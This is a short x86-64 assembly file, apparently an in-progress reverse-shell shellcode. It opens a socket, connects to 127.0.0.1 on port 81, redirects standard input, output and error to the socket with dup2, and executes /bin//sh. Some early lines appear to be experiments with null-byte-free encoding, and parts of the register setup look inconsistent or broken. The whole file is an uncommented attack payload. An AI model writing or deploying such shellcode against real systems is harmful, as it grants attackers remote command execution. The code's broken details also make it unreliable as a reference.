section .text
global _start
    
_start: 



    mov eax, 0x80808080
    add eax, 0x7f7f8f80

    mov eax, 0x7f7f8f80
    neg eax
    add eax, 0x1000

    push -1
    pop rsi
    not rsi
    ;mov rsi, 0x1
    push -4
    pop rax
    xor rax, -1




    ;mov rdx, 0x0
    shr rdx, 32
    shr rdx, 32
    
    mov rax, 0x29
    syscall ; creates the socket

    mov rdi, rax
    sub rsp, 0x80

    

    push QWORD 0x00
    push DWORD 0x0100007F
    push WORD 0x5100
    push WORD 0x02

    mov rsi, rsp
    mov rdx, 0x10
    mov rax, 0x2a
    syscall

    xor rsi, rsi
    mov rax, 0x21
    syscall
    mov rax, 0x21
    inc rsi
    syscall
    mov rax, 0x21
    inc rsi
    syscall

    mov rax, '/bin//sh'
    push rax
    mov BYTE [rsp+8], 0x00
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx 
    mov rax, 0x3B
    syscall

